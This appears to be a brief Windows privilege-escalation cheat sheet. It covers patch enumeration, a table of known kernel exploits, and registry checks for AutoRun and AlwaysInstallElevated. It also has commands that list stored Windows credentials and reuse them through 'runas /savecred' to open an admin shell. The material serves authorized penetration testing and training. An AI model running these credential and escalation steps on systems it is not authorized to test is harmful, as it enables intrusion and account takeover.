# Windows Kernel Exploits & Registry

## Kernel Exploits
```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Common Windows Kernel Exploits
| Exploit | OS Versions |
|---|---|
| MS17-010 (EternalBlue) | Windows 7/2008/2003 (unpatched) |
| MS16-032 | Windows 7/8/10, 2008/2012 |
| PrintSpoofer | Any with SeImpersonate |
| CVE-2021-36934 (SeriousSAM) | Windows 10 1809+ |

### Windows Exploit Suggester
```bash
python windows-exploit-suggester.py --database 2024-xx-xx.xls --systeminfo sysinfo.txt
```

## Registry Exploits

### AutoRun
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

### Stored Credentials
```cmd
cmdkey /list
runas /savecred /user:admin cmd.exe
vaultcmd /listcreds:"Windows Credentials" /all
```

### AlwaysInstallElevated
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```
